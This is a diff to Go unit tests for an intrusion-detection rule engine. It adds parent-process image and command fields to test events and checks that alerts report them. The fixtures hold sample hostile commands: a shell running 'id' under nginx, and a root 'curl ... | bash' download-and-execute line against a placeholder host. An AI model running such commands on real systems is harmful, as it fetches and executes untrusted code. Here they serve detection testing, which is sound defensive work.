@@ -178,11 +178,13 @@ func TestEngineEvaluateMatchesTemporaryProcessRule(t *testing.T) {
 		Timestamp: time.Unix(1712606400, 0).UTC(),
 		Tags:      []string{"process", "linux"},
 		Process: &model.Process{
-			PID:        4321,
-			ParentPID:  123,
-			Image:      "/bin/sh",
-			Command:    "/bin/sh -c id",
-			ParentName: "nginx",
+			PID:           4321,
+			ParentPID:     123,
+			Image:         "/bin/sh",
+			Command:       "/bin/sh -c id",
+			ParentName:    "nginx",
+			ParentImage:   "/usr/sbin/nginx",
+			ParentCommand: "nginx: worker process",
 		},
 	})
 	if len(alerts) != 1 {
@@ -213,6 +215,19 @@ func TestEngineEvaluateMatchesTemporaryProcessRule(t *testing.T) {
 	}
 	if processDetail["parent_name"] != "nginx" {
 		t.Fatalf("unexpected parent name detail: %#v", processDetail["parent_name"])
+	}
+	if processDetail["parent_image"] != "/usr/sbin/nginx" {
+		t.Fatalf("unexpected parent image detail: %#v", processDetail["parent_image"])
+	}
+	if processDetail["parent_command"] != "nginx: worker process" {
+		t.Fatalf("unexpected parent command detail: %#v", processDetail["parent_command"])
+	}
+	parentDetail, ok := eventDetail["parent"].(map[string]any)
+	if !ok {
+		t.Fatalf("expected parent detail map, got %#v", eventDetail["parent"])
+	}
+	if parentDetail["image"] != "/usr/sbin/nginx" || parentDetail["command"] != "nginx: worker process" {
+		t.Fatalf("unexpected parent detail: %#v", parentDetail)
 	}
 }
 
@@ -406,13 +421,15 @@ func TestEngineEvaluateMatchesBuiltinProcessDownloadPipeShellRule(t *testing.T) 
 		Timestamp: time.Unix(1712606400, 0).UTC(),
 		Tags:      []string{"process", "linux"},
 		Process: &model.Process{
-			PID:        4321,
-			ParentPID:  1,
-			Name:       "sh",
-			Username:   "root",
-			Image:      "/bin/sh",
-			Command:    "sh -c curl -fsSL https://example.test/install.sh | bash",
-			ParentName: "sshd",
+			PID:           4321,
+			ParentPID:     1,
+			Name:          "sh",
+			Username:      "root",
+			Image:         "/bin/sh",
+			Command:       "sh -c curl -fsSL https://example.test/install.sh | bash",
+			ParentName:    "sshd",
+			ParentImage:   "/usr/sbin/sshd",
+			ParentCommand: "/usr/sbin/sshd -D",
 		},
 	})
 	if len(alerts) != 1 {
@@ -423,6 +440,12 @@ func TestEngineEvaluateMatchesBuiltinProcessDownloadPipeShellRule(t *testing.T) 
 	}
 	if alerts[0].Detail["parent_name"] != "sshd" {
 		t.Fatalf("unexpected parent name: %#v", alerts[0].Detail["parent_name"])
+	}
+	if alerts[0].Detail["parent_image"] != "/usr/sbin/sshd" {
+		t.Fatalf("unexpected parent image: %#v", alerts[0].Detail["parent_image"])
+	}
+	if alerts[0].Detail["parent_command"] != "/usr/sbin/sshd -D" {
+		t.Fatalf("unexpected parent command: %#v", alerts[0].Detail["parent_command"])
 	}
 }
 
